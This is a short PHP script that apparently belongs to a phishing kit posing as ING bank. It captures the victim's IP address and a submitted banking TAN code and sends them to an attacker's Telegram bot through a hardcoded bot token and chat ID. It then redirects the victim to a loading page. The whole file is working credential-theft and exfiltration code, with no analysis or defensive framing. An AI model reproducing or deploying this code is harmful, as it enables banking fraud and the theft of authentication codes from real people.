<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Tan Ing ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + TAN : ".$_POST['TAN']." \n\n";
$message .= "-------------- IP Infos ------------\n";
$token = "1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss";
$data = [
    'text' => $message,
    'chat_id' => '-462207069'
];

file_get_contents("https://api.telegram.org/bot1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss/sendMessage?" . http_build_query($data) );


header("Location: ../Load.html");?>


